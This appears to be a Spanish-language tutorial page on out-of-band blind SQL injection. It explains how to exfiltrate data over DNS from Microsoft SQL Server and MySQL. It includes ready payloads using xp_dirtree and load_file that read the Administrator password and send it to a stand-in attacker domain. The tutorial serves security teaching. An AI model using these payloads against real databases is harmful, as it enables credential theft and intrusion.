---
layout: default
title: 4.4 Fuera de banda
permalink: /injection_types/blind/oob_type
nav_order: 4
parent: 4. Inyecciones ciegas
has_children: true
---

# Inyecciones ciegas con interacción fuera de banda

Una SQLi ciega **fuera de banda** (*out-of-band*, *OOB*) implica enviar la información consultada a través de **un canal diferente** al utilizado para la interacción con la aplicación. Por ejemplo, el atacante puede utilizar comandos SQL que envíen información a través de una **conexión de red directa**, una **solicitud DNS** o una **solicitud HTTP**. Una vez que el atacante ha enviado la inyección, debe esperar a recibir la respuesta de la base de datos **en el canal alternativo** elegido.

En otras palabras, hay que obligar al DBMS no solo a generar una respuesta, sino también a abrir un canal alternativo de comunicación.

![Out of band diagram](/sqli-en-la-practica/assets/oob.png)

Para ejemplificar un caso de ataque se analiza un escenario con *Microsoft SQL Server* y el canal alternativo será por medio del **protocolo DNS**. Usualmente este método es efectivo ya que muchas redes permiten salida libre de consultas DNS, debido a **su importancia en el funcionamiento de los sistemas** de producción. El método para construir la consulta se apoya en la [SQL injection cheat sheet de PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet).

Asumiendo un punto de inyección como los de las secciones anteriores donde se puede escribir una consulta arbitraria, se considera el siguiente fragmento de *payload*:

```sql
exec master..xp_dirtree '//dominio.atacante.net/x'
```

Este SQL ejecuta un procedimiento almacenado de MSSQL llamado `xp_dirtree`, cuyo parámetro es el texto `'//dominio.atacante.net/x'`. `xp_dirtree` sirve para listar carpetas del sistema operativo y el parámetro **debería** ser una ruta como `C:/`. Sin embargo, abusando de la implementación de `xp_dirtree` (**si la versión y configuración del DBMS lo permiten**) esto **resultaría en una petición DNS para que el DBMS pueda obtener la IP** de `dominio.atacante.net`. Si se tiene control del servidor DNS que responde por ese dominio, se pueden obtener las consultas DNS hechas.

Herramientas como [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) cumplen este propósito, proveyendo un dominio público utilizable en este tipo de ataques y al que se pueden consultar los pedidos recibidos (HTTP y DNS). Este se encuentra disponible junto con la licencia de BurpSuite Professional, una alternativa gratuita puede ser [Interactsh](https://github.com/projectdiscovery/interactsh).

Si se recibe la consulta DNS, el siguiente paso es **agregar el resultado de una consulta al propio dominio**. Por ejemplo con la siguiente secuencia de sentencias SQL:

```sql
declare @p varchar(1024);
set @p=(SELECT password FROM users WHERE username='Administrator');
exec('master..xp_dirtree "//'+@p+'.dominio.atacante.net/x"')
```

Esto puede resultar en un pedido DNS, iniciado por el DBMS, recibido por el servidor del atacante, consultando por la IP de `47b7bfb65fa83ac9a71dcb0f6296bb6e.dominio.atacante.net`. En este ejemplo, `47b7bfb65fa83ac9a71dcb0f6296bb6e` es un hash MD5 del texto `Passw0rd!`.

El *payload* completo que podría aplicar a este ejemplo es:

```
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.dominio.atacante.net/x"')--
```

Un ejemplo de fragmento de SQL análogo para MySQL sería:

```sql
SELECT load_file(CONCAT(
    '\\\\',
    (SELECT password FROM users WHERE username='Administrator'),
    '.',
    'dominio.atacante.net\\test.txt'))
```

La función `load_file()` carga archivos del sistema de archivos del DBMS, al intentar resolver la ruta de un archivo remoto `test.txt`, pide por DNS la IP del dominio indicado.